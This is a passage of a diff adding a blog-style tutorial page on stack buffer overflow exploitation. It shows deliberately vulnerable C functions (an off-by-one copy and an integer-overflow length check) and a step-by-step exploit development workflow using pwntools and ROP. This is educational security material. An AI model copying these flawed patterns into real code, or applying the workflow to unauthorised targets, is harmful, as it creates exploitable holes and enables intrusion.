+    char buf[64];
+    for (int i = 0; i &lt;= 64; i++)  // &lt;= instead of &lt;
+        buf[i] = src[i];
+}
+
+// Pattern 4: integer overflow in length check
+void safe_copy(char *src, unsigned int len) {
+    char buf[128];
+    if (len + 1 &lt; 128)      // len = 0xFFFFFFFF → len+1 = 0 → passes!
+        memcpy(buf, src, len);
+}</code></pre></div>
+<p>Each of these creates the same primitive: controlled bytes written past the end of a stack buffer. The exploitation path is identical once you have that primitive.</p>
+<hr>
+<h2 id="11-putting-it-together-the-exploit-development-workflow">11. Putting It Together: The Exploit Development Workflow</h2>
+<p>When you encounter a binary with a suspected stack overflow:</p>
+<div class="code-wrapper"><div class="code-header"><span>code</span><button class="copy-btn" aria-label="Copy code"></button></div><pre><code>1. checksec → identify protections
+2. gdb + cyclic pattern → find exact offset
+3. Identify what you have:
+   - No NX, no PIE, no canary → shellcode
+   - NX on, no PIE, no canary → ret2libc / ret2win with static addresses
+   - NX on, PIE on, no canary → leak + compute bases + rop
+   - Canary present → find leak primitive first
+4. Find gadgets (ROPgadget / pwntools ROP())
+5. Build payload in pwntools
+6. Test locally, adjust offsets
+7. Port to remote target</code></pre></div>
+<p>The exploit is always a pipeline: corrupt the return address with a chain that achieves your goal. The complexity is in building the chain and acquiring the addresses to put in it.</p>
+<hr>
+<h2 id="whats-next">What's Next</h2>
+<p>Stack-based buffer overflow is the entry point. The same principle — controlled write past a buffer's end — powers everything above it in complexity. In the next part we'll look at <strong>ret2plt and GOT hijacking</strong> in depth, and then move into the heap where the allocator metadata becomes the target.</p>
+<p>The stack is where every exploit developer learns to walk. Now you run.</p>
+            </div>
+        </article>
+
+        <footer>
+            <span>&copy; <span class="copyright-year">2026</span> dev null notes</span>
+            <span>
+            <a href="https://github.com/mr-dev-null" style="color:var(--dim);text-decoration:none;margin-right:12px;transition:color .15s" onmouseover="this.style.color='var(--accent)'" onmouseout="this.style.color='var(--dim)'">github</a>
+            <a href="/about.html" style="color:var(--dim);text-decoration:none;transition:color .15s" onmouseover="this.style.color='var(--accent)'" onmouseout="this.style.color='var(--dim)'">about</a></span>
+        </footer>
+
+        <script src="/main.js"></script>
+    </body>
+</html>
